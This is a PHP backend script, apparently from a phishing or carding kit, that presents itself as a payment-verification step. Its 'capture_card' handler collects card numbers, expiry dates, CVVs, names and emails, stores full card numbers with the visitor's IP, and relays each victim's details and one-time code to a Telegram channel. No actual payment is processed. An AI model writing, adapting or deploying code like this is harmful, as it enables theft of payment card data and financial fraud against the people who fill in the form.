<?php
require_once 'config.php';

$action = sanitizeInput($_POST['action'] ?? '');

if ($action === 'capture_card') {
    handleCardCapture();
} elseif ($action === 'verify_otp') {
    handleOTPVerification();
} else {
    json_response(['success' => false, 'message' => 'Invalid action']);
}

function handleCardCapture() {
    global $db;
    
    // Validate required fields
    $cardNumber = sanitizeInput($_POST['cardNumber'] ?? '');
    $expiryDate = sanitizeInput($_POST['expiryDate'] ?? '');
    $cvv = sanitizeInput($_POST['cvv'] ?? '');
    $cardholderName = sanitizeInput($_POST['cardholderName'] ?? '');
    $email = sanitizeInput($_POST['email'] ?? '');
    
    // Basic validation
    if (!preg_match('/^\d{16}$/', $cardNumber)) {
        json_response(['success' => false, 'message' => 'Invalid card number']);
    }
    
    if (!preg_match('/^\d{2}\/\d{2}$/', $expiryDate)) {
        json_response(['success' => false, 'message' => 'Invalid expiry date']);
    }
    
    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        json_response(['success' => false, 'message' => 'Invalid CVV']);
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        json_response(['success' => false, 'message' => 'Invalid email address']);
    }
    
    // Generate OTP and session
    $otp = generateOTP();
    $sessionId = generateSessionId();
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    
    // Store transaction
    $query = "INSERT INTO transactions (session_id, card_number, cardholder_name, email, expiry_date, otp_code, ip_address, status) 
              VALUES (?, ?, ?, ?, ?, ?, ?, 'pending')";
    
    $stmt = $db->prepare($query);
    $stmt->bind_param('sssssss', $sessionId, $cardNumber, $cardholderName, $email, $expiryDate, $otp, $ipAddress);
    
    if (!$stmt->execute()) {
        error_log('Database error: ' . $db->error);
        json_response(['success' => false, 'message' => 'Database error']);
    }
    $stmt->close();
    
    // Log visitor action
    logVisitor('card_captured', [
        'email' => $email,
        'cardholder' => $cardholderName,
        'last_4_digits' => substr($cardNumber, -4)
    ]);
    
    // Send OTP via email (or Telegram for testing)
    $emailBody = "Your payment verification code is: <b>$otp</b>\n\nThis code will expire in 10 minutes.";
    
    // For testing, also send to Telegram
    $telegramMessage = "🔐 <b>New Payment Verification</b>\n\n";
    $telegramMessage .= "Name: " . $cardholderName . "\n";
    $telegramMessage .= "Email: " . $email . "\n";
    $telegramMessage .= "Card: ****" . substr($cardNumber, -4) . "\n";
    $telegramMessage .= "IP: " . $ipAddress . "\n";
    $telegramMessage .= "OTP: <code>$otp</code>\n";
    $telegramMessage .= "Time: " . date('Y-m-d H:i:s');
    
    sendTelegramMessage($telegramMessage);
    
    // In production, send actual email:
    // mail($email, 'Payment Verification Code', strip_tags($emailBody), "From: noreply@paymentverification.com\r\nContent-Type: text/plain; charset=utf-8");
    
    json_response([
        'success' => true,
        'message' => 'Verification code sent',
        'sessionId' => $sessionId
    ]);
}

function handleOTPVerification() {
    global $db;
    
    $sessionId = sanitizeInput($_POST['sessionId'] ?? '');
    $otpCode = sanitizeInput($_POST['otpCode'] ?? '');
    
    if (empty($sessionId) || empty($otpCode)) {
        json_response(['success' => false, 'message' => 'Missing required fields']);
    }
    
    // Get transaction
    $query = "SELECT * FROM transactions WHERE session_id = ? AND status = 'pending'";
    $stmt = $db->prepare($query);
    $stmt->bind_param('s', $sessionId);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows === 0) {
        json_response(['success' => false, 'message' => 'Session not found or already verified']);
    }
    
    $transaction = $result->fetch_assoc();
    $stmt->close();
    
    // Verify OTP
    if ($transaction['otp_code'] !== $otpCode) {
        logVisitor('otp_failed', ['session_id' => $sessionId]);
        json_response(['success' => false, 'message' => 'Invalid verification code']);
    }
    
    // Update transaction status
    $verifiedAt = date('Y-m-d H:i:s');
    $query = "UPDATE transactions SET status = 'verified', otp_verified = TRUE, verified_at = ? WHERE session_id = ?";
    $stmt = $db->prepare($query);
    $stmt->bind_param('ss', $verifiedAt, $sessionId);
    $stmt->execute();
    $stmt->close();
    
    // Log successful verification
    logVisitor('otp_verified', [
        'email' => $transaction['email'],
        'session_id' => $sessionId
    ]);
    
    // Send Telegram notification
    $telegramMessage = "✅ <b>Payment Verified Successfully</b>\n\n";
    $telegramMessage .= "Name: " . $transaction['cardholder_name'] . "\n";
    $telegramMessage .= "Email: " . $transaction['email'] . "\n";
    $telegramMessage .= "Card: ****" . substr($transaction['card_number'], -4) . "\n";
    $telegramMessage .= "Time: " . $verifiedAt;
    
    sendTelegramMessage($telegramMessage);
    
    json_response([
        'success' => true,
        'message' => 'Payment verified successfully'
    ]);
}
?>
